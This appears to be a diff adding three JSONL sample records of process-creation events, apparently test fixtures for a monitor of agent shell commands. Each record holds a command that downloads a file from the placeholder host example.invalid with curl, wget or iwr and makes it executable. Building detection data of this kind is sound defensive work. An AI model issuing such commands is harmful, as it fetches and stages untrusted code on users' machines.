@@ -1,0 +1,3 @@
+{"category":"process_creation","tool_name":"Bash","command_line":"curl -o /tmp/x.sh https://example.invalid/x.sh && chmod +x /tmp/x.sh"}
+{"category":"process_creation","tool_name":"Bash","command_line":"wget https://example.invalid/b -O b; chmod 777 b"}
+{"category":"process_creation","tool_name":"PowerShell","command_line":"iwr https://example.invalid/b -OutFile b; chmod +x b"}
